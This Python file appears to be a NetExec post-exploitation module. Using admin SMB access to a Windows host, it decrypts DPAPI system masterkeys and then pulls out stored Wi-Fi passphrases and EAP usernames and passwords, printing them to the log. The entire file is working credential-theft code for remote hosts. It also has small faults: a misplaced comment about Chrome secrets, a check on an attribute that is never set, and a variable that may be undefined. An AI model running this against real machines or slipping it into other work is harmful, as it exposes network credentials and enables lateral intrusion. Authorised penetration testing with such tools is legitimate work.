from dploot.triage.masterkeys import MasterkeysTriage
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.wifi import WifiTriage

from nxc.helpers.logger import highlight


class NXCModule:
    name = "wifi"
    description = "Get key of all wireless interfaces"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """ """

    def on_admin_login(self, context, connection):
        host = connection.hostname + "." + connection.domain
        domain = connection.domain
        username = connection.username
        kerberos = connection.kerberos
        aesKey = connection.aesKey
        use_kcache = getattr(connection, "use_kcache", False)
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        target = Target.create(
            domain=domain,
            username=username,
            password=password,
            target=host,
            lmhash=lmhash,
            nthash=nthash,
            do_kerberos=kerberos,
            aesKey=aesKey,
            no_pass=True,
            use_kcache=use_kcache,
        )

        conn = None

        try:
            conn = DPLootSMBConnection(target)
            conn.smb_session = connection.conn
        except Exception as e:
            context.log.debug(f"Could not upgrade connection: {e}")
            return

        masterkeys = []
        try:
            masterkeys_triage = MasterkeysTriage(target=target, conn=conn, dpapiSystem={})
            masterkeys += masterkeys_triage.triage_system_masterkeys()
        except Exception as e:
            context.log.debug(f"Could not get masterkeys: {e}")

        if len(masterkeys) == 0:
            context.log.fail("No masterkeys looted")
            return

        context.log.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting Wifi interfaces")

        try:
            # Collect Chrome Based Browser stored secrets
            wifi_triage = WifiTriage(target=target, conn=conn, masterkeys=masterkeys)
            wifi_creds = wifi_triage.triage_wifi()
        except Exception as e:
            context.log.debug(f"Error while looting wifi: {e}")
        for wifi_cred in wifi_creds:
            if wifi_cred.auth.upper() == "OPEN":
                context.log.highlight(f"[OPEN] {wifi_cred.ssid}")
            elif wifi_cred.auth.upper() in ["WPAPSK", "WPA2PSK", "WPA3SAE"]:
                try:
                    context.log.highlight(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - Passphrase: {wifi_cred.password.decode('latin-1')}")
                except Exception:
                    context.log.highlight(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - Passphrase: {wifi_cred.password}")
            elif wifi_cred.auth.upper() in ["WPA", "WPA2"]:
                try:
                    if self.eap_username is not None and self.eap_password is not None:
                        context.log.highlight(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - {wifi_cred.eap_type} - Identifier: {wifi_cred.eap_username}:{wifi_cred.eap_password}")
                    else:
                        context.log.highlight(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - {wifi_cred.eap_type}")
                except Exception:
                    context.log.highlight(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - Passphrase: {wifi_cred.password}")
            else:
                context.log.highlight(f"[WPA-EAP] {wifi_cred.ssid} - {wifi_cred.eap_type}")
